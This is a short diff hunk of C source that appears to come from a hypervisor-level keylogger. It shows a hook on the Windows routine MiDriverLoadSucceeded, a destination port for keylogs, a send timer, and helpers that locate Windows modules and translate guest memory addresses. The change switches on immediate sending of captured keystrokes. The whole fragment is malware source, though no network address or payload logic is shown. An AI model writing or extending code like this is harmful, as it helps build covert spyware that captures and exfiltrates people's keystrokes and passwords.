@@ -40,7 +40,7 @@ extern void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state);
 #define DST_KEYLOGS_PORT 49324
 
 #define SEND_TIMER_TIME 0x2ffffff
-#define IMMEDIATE_SENDING
+#define IMMEDIATE_SENDING TRUE
 
 extern qword_t find_windows_module(wchar_t *name, uint16_t len);
 extern uint64_t guest_virtual_to_physical(uint64_t addr);
